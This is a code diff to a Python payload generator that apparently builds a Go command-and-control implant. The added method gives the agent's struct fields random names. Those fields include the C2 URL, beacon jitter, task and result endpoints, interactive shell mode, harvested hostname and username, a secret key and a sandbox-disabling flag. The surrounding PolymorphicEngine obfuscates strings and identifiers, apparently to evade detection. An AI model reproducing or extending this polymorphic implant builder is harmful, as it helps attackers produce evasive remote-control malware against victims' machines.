@@ -29,6 +29,16 @@ class PolymorphicEngine:
         name = random.choice(styles)()
         return prefix + name if prefix else name
 
+    def generate_go_field_name(self, prefix='', length=None):
+        """Generate random Go struct field name (needs to start with uppercase for export)"""
+        if length is None:
+            length = random.randint(6, 12)
+
+        # Generate random name and capitalize first letter for Go export
+        name = ''.join(random.choices(string.ascii_lowercase, k=length))
+        capitalized_name = name[0].upper() + name[1:]
+        return prefix + capitalized_name if prefix else capitalized_name
+
     def obfuscate_string(self, s):
         technique = random.randint(0, 4)
 
@@ -391,32 +401,32 @@ class PayloadGenerator:
         api_response_struct_name = poly.generate_random_name('ApiResponse')
 
         # Generate random names for struct fields
-        agent_c2_url_field = poly.generate_random_name('c2')
-        agent_id_field = poly.generate_random_name('id')
-        agent_headers_field = poly.generate_random_name('headers')
-        agent_heartbeat_interval_field = poly.generate_random_name('hbInterval')
-        agent_jitter_field = poly.generate_random_name('jitter')
-        agent_register_uri_field = poly.generate_random_name('registerURI')
-        agent_tasks_uri_field = poly.generate_random_name('tasksURI')
-        agent_results_uri_field = poly.generate_random_name('resultsURI')
-        agent_interactive_uri_field = poly.generate_random_name('interactiveURI')
-        agent_interactive_status_uri_field = poly.generate_random_name('interactiveStatusURI')
-        agent_running_field = poly.generate_random_name('running')
-        agent_interactive_mode_field = poly.generate_random_name('interactiveMode')
-        agent_hostname_field = poly.generate_random_name('hostname')
-        agent_username_field = poly.generate_random_name('username')
-        agent_osinfo_field = poly.generate_random_name('osInfo')
-        agent_secret_key_field = poly.generate_random_name('secretKey')
-        agent_current_interactive_task_field = poly.generate_random_name('currentInteractiveTask')
-        agent_disable_sandbox_field = poly.generate_random_name('disableSandbox')
+        agent_c2_url_field = poly.generate_go_field_name('C2')
+        agent_id_field = poly.generate_go_field_name('ID')
+        agent_headers_field = poly.generate_go_field_name('Headers')
+        agent_heartbeat_interval_field = poly.generate_go_field_name('HbInterval')
+        agent_jitter_field = poly.generate_go_field_name('Jitter')
+        agent_register_uri_field = poly.generate_go_field_name('RegisterURI')
+        agent_tasks_uri_field = poly.generate_go_field_name('TasksURI')
+        agent_results_uri_field = poly.generate_go_field_name('ResultsURI')
+        agent_interactive_uri_field = poly.generate_go_field_name('InteractiveURI')
+        agent_interactive_status_uri_field = poly.generate_go_field_name('InteractiveStatusURI')
+        agent_running_field = poly.generate_go_field_name('Running')
+        agent_interactive_mode_field = poly.generate_go_field_name('InteractiveMode')
+        agent_hostname_field = poly.generate_go_field_name('Hostname')
+        agent_username_field = poly.generate_go_field_name('Username')
+        agent_osinfo_field = poly.generate_go_field_name('OSInfo')
+        agent_secret_key_field = poly.generate_go_field_name('SecretKey')
+        agent_current_interactive_task_field = poly.generate_go_field_name('CurrentInteractiveTask')
+        agent_disable_sandbox_field = poly.generate_go_field_name('DisableSandbox')
 
         # Generate random names for task struct fields
-        task_id_field = poly.generate_random_name('id')
-        task_command_field = poly.generate_random_name('cmd')
+        task_id_field = poly.generate_go_field_name('ID')
+        task_command_field = poly.generate_go_field_name('Cmd')
 
         # Generate random names for task result struct fields
-        task_result_task_id_field = poly.generate_random_name('taskId')
-        task_result_result_field = poly.generate_random_name('result')
+        task_result_task_id_field = poly.generate_go_field_name('TaskID')
+        task_result_result_field = poly.generate_go_field_name('Result')
 
         # Generate random names for function names
         agent_encrypt_data_func = poly.generate_random_name('encryptData')
